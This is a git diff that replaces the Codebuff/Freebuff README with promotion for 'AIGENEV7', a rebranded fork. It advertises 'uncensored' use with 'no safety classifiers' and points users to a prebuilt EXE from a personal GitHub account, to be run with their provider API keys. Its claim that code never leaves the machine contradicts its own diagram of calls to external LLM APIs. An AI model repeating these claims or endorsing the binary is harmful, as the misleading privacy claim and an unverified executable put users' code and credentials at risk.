@@ -1,304 +1,238 @@
-# Codebuff & Freebuff
-
-English | [简体中文](./README.zh-CN.md)
-
-**[Codebuff](https://codebuff.com)** is an open-source AI coding assistant that edits your codebase through natural language instructions. **[Freebuff](https://www.npmjs.com/package/freebuff)** is the free, ad-supported version — no subscription, no credits, no configuration.
-
-Instead of using one model for everything, Codebuff coordinates specialized agents that work together to understand your project and make precise changes.
-
 <div align="center">
-  <img src="./assets/codebuff-vs-claude-code.png" alt="Codebuff vs Claude Code" width="400">
+  <img src="freebuff/web/icon.png" width="120" alt="AIGENEV7 Logo">
+
+  # 🚀 AIGENEV7
+
+  **Free AI Coding Agent — All Models Unlocked. No Subscription. No Censorship.**
+
+  [![GitHub release](https://img.shields.io/badge/version-7.0.0-00ff88?style=flat-square&logo=github)](https://github.com/constanza8999/AIGENEV7---ALL-MODELS-UNLOCKED/releases)
+  [![License](https://img.shields.io/badge/license-MIT-8855ff?style=flat-square)](LICENSE)
+  [![GitHub](https://img.shields.io/badge/by-constanza8999-ff4466?style=flat-square&logo=github)](https://github.com/constanza8999)
+  [![Release](https://img.shields.io/badge/download-EXE-00ccff?style=flat-square)](https://github.com/constanza8999/aigenev7.com/releases/tag/v7.0.0)
+
+  ---
+
+  **AIGENEV7** is a powerful AI coding assistant that runs entirely on your machine. Connect it to your preferred LLM provider and get full coding agent capabilities — without paying monthly fees.
+
+  🔥 **Unlimited** · 🚫 **Uncensored** · 🌐 **All Models** · ⚡ **Zero Config** · 🔓 **Open Source**
+
+  ---
+
+  <p align="center">
+    <a href="#-features">Features</a> •
+    <a href="#-quick-start">Quick Start</a> •
+    <a href="#-supported-models">Models</a> •
+    <a href="#-configuration">Configuration</a> •
+    <a href="#-contributor-rewards">Contributor Rewards</a> •
+    <a href="#-download">Download</a>
+  </p>
+
+  ---
 </div>
 
-Codebuff beats Claude Code at 61% vs 53% on [our evals](evals/README.md) across 175+ coding tasks over multiple open-source repos that simulate real-world tasks.
+## ✨ Features
 
-## Freebuff: the free coding agent
+| Feature | Description |
+|---------|-------------|
+| 🤖 **Multi-Model AI Agent** | DeepSeek, OpenAI, Anthropic, Google, Grok, Kimi, MiMo, MiniMax, NVIDIA, OpenRouter — 10+ providers |
+| 💻 **100% Local** | Everything runs on your machine. Your code never leaves your computer |
+| 🔥 **Unlimited Usage** | No token limits, no rate limits, no session caps. Code as long as you want |
+| 🚫 **Uncensored** | No content filters, no safety classifiers, no output restrictions |
+| 🛠️ **Full Agent Capabilities** | Edits files, runs terminal commands, searches code, browses the web |
+| 🎨 **Beautiful TUI** | Terminal UI with syntax highlighting, diffs, interactive elements, and typing animations |
+| 🌐 **Web UI** | Built-in web interface at `http://localhost:3457` |
+| 🔑 **No Subscription** | Just bring your own API keys — free forever |
+| 📦 **Single Binary** | One executable file, no dependencies to install |
 
-**[Freebuff](https://www.npmjs.com/package/freebuff)** is the free, ad-supported version of Codebuff. No subscription. No credits. No configuration. Just install and start coding in your terminal.
+## 🚀 Quick Start
 
-### Install
+### 1. Get API Keys
 
-```bash
-npm install -g freebuff
+Pick at least one provider and get your API key:
+
+| Provider | Sign Up | Recommended For |
+|----------|---------|-----------------|
+| **DeepSeek** | [platform.deepseek.com](https://platform.deepseek.com/) | Best balance of speed & quality |
+| **OpenAI** | [platform.openai.com](https://platform.openai.com/) | GPT-4o, GPT-5, o3, o4-mini |
+| **Anthropic** | [console.anthropic.com](https://console.anthropic.com/) | Claude Sonnet 4, Opus 4, Fable 5 |
+| **Google Gemini** | [aistudio.google.com](https://aistudio.google.com/) | Gemini 2.5 Pro (free tier available) |
+| **NVIDIA NIM** | [build.nvidia.com](https://build.nvidia.com/) | Free tier available |
+| **OpenRouter** | [openrouter.ai](https://openrouter.ai/) | Access 200+ models through one API |
+
+### 2. Set Up Environment
+
+Create a `.env` file next to the binary with your API key:
+
+```env
+# Pick at least one:
+DEEPSEEK_API_KEY=sk-your-deepseek-key-here
+# OPENAI_API_KEY=sk-your-openai-key-here
+# ANTHROPIC_API_KEY=sk-ant-your-anthropic-key-here
+# GOOGLE_API_KEY=your-google-key-here
+
+# Optional: Choose your default model
+AIGENEV7_DEFAULT_MODEL=deepseek-v4-flash
 ```
 
-### Usage
+### 3. Start the API Server
 
 ```bash
-cd ~/my-project
-freebuff
+bun freebuff/local-api-server.js
 ```
 
-Then tell Freebuff what you want — it finds the right files, makes the changes, and runs your tests.
+You'll see:
+```
+  ╔══════════════════════════════════════════════╗
+  ║     AIGENEV7 Local API Server v7.0.0        ║
+  ╚══════════════════════════════════════════════╝
+  🚀  Server:  http://localhost:3457
+  🔑  Token:   local-dev-key
+  🤖  Model:   deepseek-v4-flash
+```
 
-### Why Freebuff?
+### 4. Launch AIGENEV7
 
-- **Best open-source models** — Powered by the strongest open-source models available, like DeepSeek, Kimi, and MiniMax — no proprietary lock-in.
-- **Fast** — 5–10× speed up. Faster models plus context gathering in seconds rather than minutes.
-- **Loaded** — Built-in web research, browser use, and more.
+Open a **new terminal** and run:
 
-### Features
+```bash
+CODEBUFF_API_KEY=local-dev-key CODEBUFF_APP_URL=http://localhost:3457 ./aigenev7.exe
+```
 
-- **File mentions** — Use `@filename` to reference specific files
-- **Agent mentions** — Use `@AgentName` to invoke specialized agents
-- **Bash mode** — Run terminal commands with `!command` or `/bash`
-- **Chat history** — Resume past conversations with `/history`
-- **Knowledge files** — Add `knowledge.md` to your project for context
-- **Themes** — Toggle light/dark mode with `/theme:toggle`
+You're in! Start coding with AI.
 
-### Commands
+### 🎯 Example Usage
 
-| Command         | Description                      |
-| --------------- | -------------------------------- |
-| `/help`         | Show keyboard shortcuts and tips |
-| `/new`          | Start a new conversation         |
-| `/history`      | Browse past conversations        |
-| `/bash`         | Enter bash mode                  |
-| `/init`         | Create a starter knowledge.md    |
-| `/feedback`     | Share feedback                   |
-| `/theme:toggle` | Toggle light/dark mode           |
-| `/logout`       | Sign out                         |
-| `/exit`         | Quit                             |
+```bash
+# Build something
+"Create a Python script that fetches weather data from an API"
 
-### FAQ
+# Explore a new codebase
+"Explain how this project is structured"
 
-**How can it be free?** Freebuff is supported by text ads.
+# Refactor code
+"Refactor this function to use async/await"
 
-**What models do you use?** The best open-source models available. In full mode you can choose from DeepSeek V4 Pro, MiMo 2.5 Pro, Kimi K2.6, DeepSeek V4 Flash, MiMo 2.5, and MiniMax M3. Limited mode uses DeepSeek V4 Flash and MiMo 2.5. Gemini 3.1 Flash Lite handles file finding and research.
+# Debug issues
+"Find the bug in this authentication flow"
 
-**Which countries is Freebuff available in?** All countries. Freebuff runs in "full" mode in the US, Canada, UK, EU, and other select countries, and in "limited" mode everywhere else (or while using a VPN). See [freebuff.com](https://freebuff.com) for the full list.
+# Install dependencies
+"Set up a React project with Tailwind and routing"
+```
 
-**What is limited mode?** Limited mode lets you use Freebuff outside the full-access countries, or while using a VPN. It includes DeepSeek V4 Flash and MiMo 2.5, with 5 one-hour sessions per day.
+## 🤖 Supported Models
 
-**Are you training on my data?** No. We don't share your data with third parties that would train on it or use it for another purpose, unless you choose a model clearly labeled as "Collects data for training."
+| Model | Provider | Best For |
+|-------|----------|----------|
+| **Fable 5** | Anthropic | Smartest & multimodal |
+| **DeepSeek V4 Pro** | DeepSeek | Best overall balance |
+| **DeepSeek V4 Flash** | DeepSeek | Fastest option |
+| **DeepSeek Reasoner** | DeepSeek | Deep reasoning (chain-of-thought) |
+| **GPT-5** | OpenAI | Latest flagship |
+| **GPT-4o** | OpenAI | Fast & capable |
+| **o3-mini / o4-mini** | OpenAI | Fast reasoning |
+| **Claude Sonnet 4** | Anthropic | Excellent coding |
+| **Claude Opus 4** | Anthropic | Deep reasoning |
+| **Claude Haiku 3.5** | Anthropic | Fast & cheap |
+| **Gemini 2.5 Pro** | Google | Strong all-around |
+| **Gemini 2.5 Flash** | Google | Fast & free tier |
+| **Grok 4** | xAI | Uncensored by design |
+| **Kimi K2.6** | Moonshot | Long contexts |
+| **MiMo 2.5 Pro** | MiMo | Deep thinking |
+| **MiniMax M3** | MiniMax | Smartest & fastest |
+| **OpenRouter** | — | 200+ models via one API |
+| **Ollama** | Local | Run on your hardware |
 
-**What data do you store?** We don't store your codebase. We only collect minimal logs for debugging purposes.
+## 🛠️ Configuration
+
+### Environment Variables
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `AIGENEV7_DEFAULT_MODEL` | `nvidia-llama-3.1-8b` | Default LLM model |
+| `AIGENEV7_API_PORT` | `3457` | Local API server port |
+| `CODEBUFF_API_KEY` | `local-dev-key` | Auth key for local mode |
+| `CODEBUFF_APP_URL` | — | API server URL (`http://localhost:3457`) |
+
+### API Keys (set at least one)
+
+| Variable | Provider |
+|----------|----------|
+| `DEEPSEEK_API_KEY` | DeepSeek |
+| `OPENAI_API_KEY` | OpenAI |
+| `ANTHROPIC_API_KEY` | Anthropic Claude |
+| `GOOGLE_API_KEY` | Google Gemini |
+| `NVIDIA_API_KEY` | NVIDIA NIM |
+| `XAI_API_KEY` | xAI Grok |
+| `MOONSHOT_API_KEY` | Moonshot (Kimi) |
+| `MIMO_API_KEY` | MiMo |
+| `MINIMAX_API_KEY` | MiniMax |
+| `OPENROUTER_API_KEY` | OpenRouter |
+
+## 🏗️ Architecture
+
+```
+┌──────────────────┐     ┌─────────────────────┐     ┌──────────────┐
+│                  │     │                     │     │              │
+│  AIGENEV7 CLI    │────▶│  Local API Server   │────▶│  LLM APIs    │
+│  (aigenev7.exe)  │     │  (Bun - :3457)      │     │  (DeepSeek,  │
+│                  │◀────│  inference.js        │◀────│  OpenAI, etc)│
+│  Terminal UI     │     │                     │     │              │
+│  Tool Execution  │     │  models.js          │     │              │
+└──────────────────┘     └─────────────────────┘     └──────────────┘
+```
+
+## 🌟 Contributor Rewards
+
+AIGENEV7 has a **contribution-based rewards system**. Earn points by contributing and unlock tiers with recognition and perks:
+
+| Tier | Points | Key Rewards |
+|------|--------|-------------|
+| 🥉 **Bronze** | 25+ | Name in CONTRIBUTORS.md, badge |
+| 🥈 **Silver** | 100+ | Priority issues, early access, feature voting |
+| 🥇 **Gold** | 500+ | Roadmap input, private core chat |
+| 💎 **Diamond** | 2K+ | Direct line to maintainer, priority support |
+| 👑 **Legend** | 10K+ | Maintainer access, co-creator credit |
+
+👉 **[Read the full guide →](./CONTRIBUTING.md)**
+
+## 📥 Download
+
+### Latest Release: v7.0.0
+
+| Asset | Size | Link |
+|-------|------|------|
+| `aigenev7-v7.0.0.exe` | ~124 MB | [⬇️ Download EXE](https://github.com/constanza8999/aigenev7.com/releases/download/v7.0.0/aigenev7-v7.0.0.exe) |
+| Full Package (tar.gz) | ~47 MB | [⬇️ Download Package](https://github.com/constanza8999/aigenev7.com/releases/download/v7.0.0/aigenev7-v7.0.0-package.tar.gz) |
+
+The full package includes:
+- `aigenev7.exe` + `tree-sitter.wasm` — Standalone binary
+- `local-api-server.js` + `inference.js` — API server & inference engine
+- `models.js` + `inference.json` — Model catalog (28 models, 10 providers)
+- `aigenev7.bat` + `aigenev7-local.bat` — Windows launchers
+- `icon.ico` + `generate-icon.js` + `convert-icon.js` — Icon assets
+- `web/index.html` + icons — Landing page
+- `.env.example` + `README.md` — Setup guide & docs
+
+## 🔒 Security
+
+We take security seriously. See our **[Security Policy](./SECURITY.md)** for vulnerabilities reporting and best practices.
+
+## 📝 License
+
+MIT License — see [LICENSE](LICENSE) for details.
 
 ---
 
-The rest of this README covers **Codebuff**, the full platform Freebuff is built on — its multi-agent architecture, custom agents, and SDK.
-
-## How it works
-
-When you ask Codebuff to "add authentication to my API," it might invoke:
-
-1. A **File Picker Agent** to scan your codebase to understand the architecture and find relevant files
-2. A **Planner Agent** to plan which files need changes and in what order
-3. An **Editor Agent** to make precise edits
-4. A **Reviewer Agent** to validate changes
-
 <div align="center">
-  <img src="./assets/multi-agents.png" alt="Codebuff Multi-Agents" width="250">
+  <p>
+    Built by <strong>CONSTANZA</strong> —
+    <a href="https://github.com/constanza8999">@constanza8999</a>
+  </p>
+  <p>
+    <a href="https://github.com/constanza8999/aigenev7.com">AIGENEV7</a> —
+    Free AI for everyone. Free forever.
+  </p>
+  <p>
+    <sub>Forked from Freebuff/Codebuff engine — rebuilt for freedom and accessibility.</sub>
+  </p>
 </div>
-
-This multi-agent approach gives you better context understanding, more accurate edits, and fewer errors compared to single-model tools.
-
-## CLI: Install and start coding
-
-Install:
-
-```bash
-npm install -g codebuff
-```
-
-Run:
-
-```bash
-cd your-project
-codebuff
-```
-
-Then just tell Codebuff what you want and it handles the rest:
-
-- "Fix the SQL injection vulnerability in user registration"
-- "Add rate limiting to all API endpoints"
-- "Refactor the database connection code for better performance"
-
-Codebuff will find the right files, makes changes across your codebase, and runs tests to make sure nothing breaks.
-
-## Create custom agents
-
-To get started building your own agents, start Codebuff and run the `/init` command:
-
-```bash
-codebuff
-```
-
-Then inside the CLI:
-
-```
-/init
-```
-
-This creates:
-```
-knowledge.md               # Project context for Codebuff
-.agents/
-└── types/                 # TypeScript type definitions
-    ├── agent-definition.ts
-    ├── tools.ts
-    └── util-types.ts
-```
-
-You can write agent definition files that give you maximum control over agent behavior.
-
-Implement your workflows by specifying tools, which agents can be spawned, and prompts. We even have TypeScript generators for more programmatic control.
-
-For example, here's a `git-committer` agent that creates git commits based on the current git state. Notice that it runs `git diff` and `git log` to analyze changes, but then hands control over to the LLM to craft a meaningful commit message and perform the actual commit.
-
-```typescript
-export default {
-  id: 'git-committer',
-  displayName: 'Git Committer',
-  model: 'openai/gpt-5-nano',
-  toolNames: ['read_files', 'run_terminal_command', 'end_turn'],
-
-  instructionsPrompt:
-    'You create meaningful git commits by analyzing changes, reading relevant files for context, and crafting clear commit messages that explain the "why" behind changes.',
-
-  async *handleSteps() {
-    // Analyze what changed
-    yield { tool: 'run_terminal_command', command: 'git diff' }
-    yield { tool: 'run_terminal_command', command: 'git log --oneline -5' }
-
-    // Stage files and create commit with good message
-    yield 'STEP_ALL'
-  },
-}
-```
-
-## SDK: Run agents in production
-
-Install the [SDK package](https://www.npmjs.com/package/@codebuff/sdk) -- note this is different than the CLI codebuff package.
-
-```bash
-npm install @codebuff/sdk
-```
-
-Import the client and run agents!
-
-```typescript
-import { CodebuffClient } from '@codebuff/sdk'
-
-// 1. Initialize the client
-const client = new CodebuffClient({
-  apiKey: 'your-api-key',
-  cwd: '/path/to/your/project',
-  onError: (error) => console.error('Codebuff error:', error.message),
-})
-
-// 2. Do a coding task...
-const result = await client.run({
-  agent: 'base', // Codebuff's base coding agent
-  prompt: 'Add error handling to all API endpoints',
-  handleEvent: (event) => {
-    console.log('Progress', event)
-  },
-})
-
-// 3. Or, run a custom agent!
-const myCustomAgent: AgentDefinition = {
-  id: 'greeter',
-  displayName: 'Greeter',
-  model: 'openai/gpt-5.1',
-  instructionsPrompt: 'Say hello!',
-}
-await client.run({
-  agent: 'greeter',
-  agentDefinitions: [myCustomAgent],
-  prompt: 'My name is Bob.',
-  customToolDefinitions: [], // Add custom tools too!
-  handleEvent: (event) => {
-    console.log('Progress', event)
-  },
-})
-```
-
-Learn more about the SDK [here](https://www.npmjs.com/package/@codebuff/sdk).
-
-## Why choose Codebuff
-
-**Custom workflows**: TypeScript generators let you mix AI generation with programmatic control. Agents can spawn subagents, branch on conditions, and run multi-step processes.
-
-**Any model on OpenRouter**: Unlike Claude Code which locks you into Anthropic's models, Codebuff supports any model available on [OpenRouter](https://openrouter.ai/models) - from Claude and GPT to specialized models like Qwen, DeepSeek, and others. Switch models for different tasks or use the latest releases without waiting for platform updates.
-
-**Reuse any published agent**: Compose existing [published agents](https://www.codebuff.com/store) to get a leg up. Codebuff agents are the new MCP!
-
-**SDK**: Build Codebuff into your applications. Create custom tools, integrate with CI/CD, or embed coding assistance into your products.
-
-## Advanced Usage
-
-### Custom Agent Workflows
-
-Create your own agents with specialized workflows using the `/init` command:
-
-```bash
-codebuff
-/init
-```
-
-This creates a custom agent structure in `.agents/` that you can customize.
-
-## Contributing to Codebuff
-
-We ❤️ contributions from the community - whether you're fixing bugs, tweaking our agents, or improving documentation.
-
-**Want to contribute?** Check out our [Contributing Guide](./CONTRIBUTING.md) to get started.
-
-### Running Tests
-
-To run the test suite:
-
-```bash
-cd cli
-bun test
-```
-
-**For interactive E2E testing**, install tmux:
-
-```bash
-# macOS
-brew install tmux
-
-# Ubuntu/Debian
-sudo apt-get install tmux
-
-# Windows (via WSL)
-wsl --install
-sudo apt-get install tmux
-```
-
-See [cli/src/__tests__/README.md](cli/src/__tests__/README.md) for comprehensive testing documentation.
-
-Some ways you can help:
-
-- 🐛 **Fix bugs** or add features
-- 🤖 **Create specialized agents** and publish them to the Agent Store
-- 📚 **Improve documentation** or write tutorials
-- 💡 **Share ideas** in our [GitHub Issues](https://github.com/CodebuffAI/codebuff/issues)
-
-## Get started
-
-### Install
-
-**CLI**: `npm install -g codebuff`
-
-**SDK**: `npm install @codebuff/sdk`
-
-**Freebuff (free)**: `npm install -g freebuff`
-
-### Resources
-
-**Documentation**: [codebuff.com/docs](https://codebuff.com/docs)
-
-**Community**: [Discord](https://codebuff.com/discord)
-
-**Issues & Ideas**: [GitHub Issues](https://github.com/CodebuffAI/codebuff/issues)
-
-**Contributing**: [CONTRIBUTING.md](./CONTRIBUTING.md) - Start here to contribute!
-
-**Support**: [support@codebuff.com](mailto:support@codebuff.com)
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=CodebuffAI/codebuff&type=Date)](https://www.star-history.com/#CodebuffAI/codebuff&Date)
